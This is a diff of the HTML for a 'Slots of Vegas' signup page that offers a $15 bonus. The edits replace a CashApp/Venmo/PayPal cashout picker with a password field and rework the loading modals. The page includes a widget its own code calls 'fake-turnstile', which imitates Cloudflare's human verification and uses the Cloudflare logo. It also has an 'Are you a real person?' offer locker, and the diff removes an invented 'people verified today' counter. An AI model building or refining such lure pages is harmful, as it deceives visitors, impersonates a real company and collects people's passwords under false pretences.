@@ -109,37 +109,25 @@
 
   <div class="modal-overlay" id="processModal" aria-hidden="true">
     <div class="process-card" role="dialog" aria-modal="true" aria-label="Creating account">
-      <!-- Processing State -->
+      <!-- Modern Processing State -->
       <div id="processingState">
-        <div class="pc-progress-ring">
-          <svg viewBox="0 0 80 80">
-            <circle class="ring-bg" cx="40" cy="40" r="35" />
-            <circle class="ring-fill" id="progressRing" cx="40" cy="40" r="35" />
-          </svg>
-          <div class="ring-icon">
+        <div class="proc-anim">
+          <div class="proc-orbit">
+            <div class="proc-dot d1"></div>
+            <div class="proc-dot d2"></div>
+            <div class="proc-dot d3"></div>
+          </div>
+          <div class="proc-center-icon">
             <ion-icon name="person-add" id="ringIcon"></ion-icon>
           </div>
         </div>
-        <div class="pc-head">
-          <h2>Setting Up Your Account</h2>
-          <p>This only takes a moment...</p>
+        <div class="proc-text">
+          <h2 id="procTitle">Creating your account</h2>
+          <p id="procSubtitle">Please wait a moment...</p>
         </div>
-
-        <div class="steps">
-          <div class="step" id="step1">
-            <div class="badge"></div><span>Verifying your details</span>
-          </div>
-          <div class="step" id="step2">
-            <div class="badge"></div><span>Connecting <b id="payNameDisplay">CashApp</b> cashout</span>
-          </div>
-          <div class="step" id="step3">
-            <div class="badge"></div><span>Applying <b style="color:#10b981">$15 bonus</b> credit</span>
-          </div>
-          <div class="step" id="step4">
-            <div class="badge"></div><span>Finalizing account setup</span>
-          </div>
+        <div class="proc-bar-wrap">
+          <div class="proc-bar" id="procBar"></div>
         </div>
-
         <div class="pc-secure-note">
           <ion-icon name="shield-checkmark"></ion-icon>
           Secure 256-bit encrypted connection
@@ -151,10 +139,10 @@
         <div class="success-badge">
           <ion-icon name="checkmark-circle"></ion-icon>
         </div>
-        <h2 style="font-size: 22px; font-weight: 700; color: #1e293b; margin: 0 0 6px; text-align: center;">You're All
+        <h2 style="font-size: 22px; font-weight: 700; color: #e2e8f0; margin: 0 0 6px; text-align: center;">You&#39;re All
           Set!</h2>
         <p class="success-subtitle" id="successSubtitle"
-          style="color: #64748b; font-size: 14px; margin: 0 0 20px; text-align: center;">Your account has been created
+          style="color: #94a3b8; font-size: 14px; margin: 0 0 20px; text-align: center;">Your account has been created
           and your bonus is ready.</p>
 
         <div class="success-details">
@@ -168,7 +156,7 @@
             <div class="detail-check">
               <ion-icon name="checkmark"></ion-icon>
             </div>
-            <span>Cashout method connected</span>
+            <span>Password secured</span>
           </div>
           <div class="detail-item" id="bonusDetailItem">
             <div class="detail-check">
@@ -226,8 +214,8 @@
         </div>
         <div class="activated-row">
           <ion-icon name="checkmark-circle"></ion-icon>
-          <span>Cashout Method</span>
-          <span class="activated-val" id="activatedCashout">Connected</span>
+          <span>Account Security</span>
+          <span class="activated-val" id="activatedCashout">Protected</span>
         </div>
       </div>
 
@@ -286,32 +274,36 @@
         <div class="turnstile-container">
           <div class="fake-turnstile" id="fakeTurnstile">
             <div class="turnstile-checkbox" id="fakeTurnstileCheckbox">
-              <span class="turnstile-checkbox-icon">✓</span>
+              <span class="turnstile-checkbox-icon">&#10003;</span>
+              <div class="turnstile-spinner"></div>
             </div>
             <div class="turnstile-label">
-              <div class="turnstile-label-text">I am human</div>
+              <div class="turnstile-label-text" id="turnstileLabelText">I am human</div>
             </div>
             <div class="turnstile-branding">
               <img class="turnstile-cf-icon" src="../assets/images/Cloudflare_Logo.svg" alt="Cloudflare">
               <div class="turnstile-links">
-                <a href="#" onclick="return false;">Privacy</a> · <a href="#" onclick="return false;">Terms</a>
+                <a href="#" onclick="return false;">Privacy</a> &middot; <a href="#" onclick="return false;">Terms</a>
               </div>
             </div>
           </div>
         </div>
       </div>
 
-      <div class="verification-buttons">
-        <button type="button" class="verify-btn cancel" id="verificationCancel" onclick="closeVerificationModal()" style="display:none">
-          Cancel
-        </button>
-        <button type="button" class="verify-btn" id="verificationConfirm" disabled>
-          <span>Verify & Continue</span>
-        </button>
-      </div>
-
       <div class="verification-footer">
-        <span>Performance & security by <span class="cf-brand">Cloudflare</span></span>
+        <span>Performance &amp; security by <span class="cf-brand">Cloudflare</span></span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Pre-Verification Processing Modal -->
+  <div class="preverify-overlay" id="preverifyModal">
+    <div class="preverify-card">
+      <div class="preverify-spinner"></div>
+      <h3 id="preverifyTitle">Activating Account</h3>
+      <p id="preverifySubtitle">Setting up your profile...</p>
+      <div class="preverify-bar-wrap">
+        <div class="preverify-bar" id="preverifyBar"></div>
       </div>
     </div>
   </div>
@@ -335,6 +327,9 @@
 
     <section class="card" id="mainCard" aria-label="Sign up form">
       <div class="header">
+        <div class="game-logo-wrap">
+          <img src="/assets/images/games/slotsofvegas.gif" alt="" class="game-logo" />
+        </div>
         <div class="title">
           <h1>Welcome To Slots of Vegas</h1>
           <p>No credit card needed—claim your bonus now.</p>
@@ -373,35 +368,13 @@
           </div>
         </div>
 
-        <div class="field" id="f-payment">
-          <label>Select cashout method</label>
-          <div class="choice" role="radiogroup" aria-label="Cashout method">
-            <label class="opt">
-              <input type="radio" name="payment" value="CashApp" checked />
-              <div class="pill">
-                <img src="https://gameroom777.net/wp-content/uploads/2023/09/cash-app-icon.svg" alt="CashApp">
-                <span>CashApp</span>
-              </div>
-            </label>
-
-            <label class="opt">
-              <input type="radio" name="payment" value="Venmo" />
-              <div class="pill">
-                <img src="https://gameroom777.net/wp-content/uploads/2025/03/Venmo_logo.png" alt="Venmo">
-                <span>Venmo</span>
-              </div>
-            </label>
-
-            <label class="opt">
-              <input type="radio" name="payment" value="PayPal" />
-              <div class="pill">
-                <img src="https://gameroom777.net/wp-content/uploads/2023/09/paypal-2.svg" alt="PayPal">
-                <span>PayPal</span>
-              </div>
-            </label>
+        <div class="field" id="f-password">
+            <label for="password">Create Password</label>
+            <input class="input" type="password" id="password" placeholder="Min. 6 characters" autocomplete="new-password" required />
+            <ion-icon name="checkmark-circle" class="state" aria-hidden="true"></ion-icon>
+            <div class="hint" id="pHint">Use 6+ characters with a mix of letters &amp; numbers.</div>
           </div>
-          <div class="hint">Choose the method you prefer for future cashouts.</div>
-        </div>
+
 
         <div class="field" id="f-coupon">
           <label>Promo code (optional)</label>
@@ -468,7 +441,7 @@
             <div class="tick">
               <ion-icon name="checkmark"></ion-icon>
             </div>
-            <div>Pick your preferred cashout method now</div>
+            <div>Secure account with password protection</div>
           </div>
         </div>
       </div>
@@ -510,7 +483,7 @@
             style="width: 100px; height: 100px; object-fit: contain;">
         </div>
         <h2>Are you a real person?</h2>
-        <p>Complete <b>1 quick step</b> below to verify your identity</p>
+        <p>Complete <b>1 quick action</b> to verify you're human</p>
       </div>
 
       <div class="offers-grid-wrapper">
@@ -544,12 +517,6 @@
           </div>
         </div>
       </div>
-    </div>
-
-    <!-- Social Proof (outside modal card) -->
-    <div class="locker-social">
-      <span class="live-dot"></span>
-      <strong id="socialCount">247</strong> people verified today
     </div>
   </div>
 
